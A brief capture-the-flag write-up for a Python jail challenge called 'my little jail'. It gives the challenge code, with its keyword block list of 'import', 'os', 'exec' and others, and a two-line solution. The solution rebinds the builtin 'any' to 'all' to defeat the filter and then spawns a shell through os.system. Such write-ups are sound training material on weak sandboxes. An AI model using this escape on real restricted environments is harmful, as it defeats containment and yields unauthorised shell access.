# my little jail

## challenge

```py
flag = "ictf{REDACTED}"

def execute():
    try:
        command = input("> ")
        if command in ['exit', 'quit']:
            return False

        # Disallow certain keywords and built-in methods
        disallowed = ['.','help','__', 'import', 'eval', 'exec', 'os', 'sys', 'open']
        if any(x in command for x in disallowed):
            print("Error: Command not allowed!")
            return True
        
        # Execute command
        result = exec(command)
        if result:
            print(result)
        return True
    except Exception as e:
        print(f"Error")
        return True

if __name__ == "__main__":
    print("Welcome to the Python Jail! You can execute any Python command.")
    print("The goal is to reveal the flag. Type 'exit' or 'quit' to leave.")
    while execute():
        pass
```

## solution

replace any with all in the globals and then win

also exec doesnt return anything idk why the printing case is there

```
> globals()['any']=all
> __import__('os').system('sh')
```
